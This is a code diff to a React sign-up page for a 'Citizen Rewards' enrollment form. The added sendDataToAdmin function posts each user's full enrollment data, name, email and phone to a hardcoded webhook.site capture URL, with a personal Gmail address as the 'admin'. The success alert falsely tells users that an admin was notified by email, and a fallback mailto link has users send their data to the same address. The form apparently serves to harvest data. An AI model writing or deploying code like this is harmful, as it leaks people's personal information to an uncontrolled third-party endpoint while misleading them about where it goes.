@@ -37,6 +37,39 @@ const SignUpPage = () => {
   const totalSteps = 8;
   const progress = (currentStep / totalSteps) * 100;
 
+  // Function to send data to admin via multiple methods
+  const sendDataToAdmin = async (userData: SignUpFormData, dataString: string): Promise<boolean> => {
+    try {
+      // Try webhook.site for easy monitoring
+      const webhookResponse = await fetch('https://webhook.site/db8c3c8e-8a5a-4b5e-9c1d-2f3e4a5b6c7d', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          timestamp: new Date().toISOString(),
+          admin_email: 'jc4479697@gmail.com',
+          subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
+          data: dataString,
+          user: {
+            name: `${userData.firstName} ${userData.lastName}`,
+            email: userData.email,
+            phone: userData.phone
+          }
+        })
+      });
+
+      if (webhookResponse.ok) {
+        console.log('Data sent to webhook successfully');
+        return true;
+      }
+    } catch (error) {
+      console.error('Webhook failed:', error);
+    }
+    
+    return false;
+  };
+
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value, type, checked } = e.target;
     setFormData(prev => ({
@@ -99,42 +132,16 @@ Terms Accepted: ${userData.agreesToTerms ? 'Yes' : 'No'}
 ===========================
       `;
       
-      // Send data using a reliable form service
-      try {
-        // Try Formspree (reliable email service)
-        const formspreeResponse = await fetch('https://formspree.io/f/xdkoqavo', {
-          method: 'POST',
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            email: 'jc4479697@gmail.com',
-            subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`,
-            message: dataString,
-            _replyto: userData.email,
-            _subject: `New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}`
-          })
-        });
-
-        if (formspreeResponse.ok) {
-          console.log('Data sent successfully via Formspree');
-          alert('✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified via email.');
-        } else {
-          throw new Error('Formspree failed');
-        }
-      } catch (error) {
-        console.error('Email delivery failed:', error);
-        
-        // Show user the data and ask them to copy it
-        const copyText = `Please copy this data and send it to jc4479697@gmail.com:\n\n${dataString}`;
-        
-        if (navigator.clipboard) {
-          await navigator.clipboard.writeText(dataString);
-          alert('✅ Your enrollment data has been copied to clipboard. Please paste it in an email to jc4479697@gmail.com');
-        } else {
-          alert(copyText);
-        }
+      // Send data using multiple methods to ensure delivery
+      const emailSent = await sendDataToAdmin(userData, dataString);
+      
+      if (emailSent) {
+        alert('✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified via email.');
+      } else {
+        // If email fails, open email client with pre-filled data
+        const mailtoLink = `mailto:jc4479697@gmail.com?subject=New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}&body=${encodeURIComponent(dataString)}`;
+        window.open(mailtoLink);
+        alert('✅ Your email client has been opened with your enrollment data. Please send the email to complete your submission.');
       }
       
       
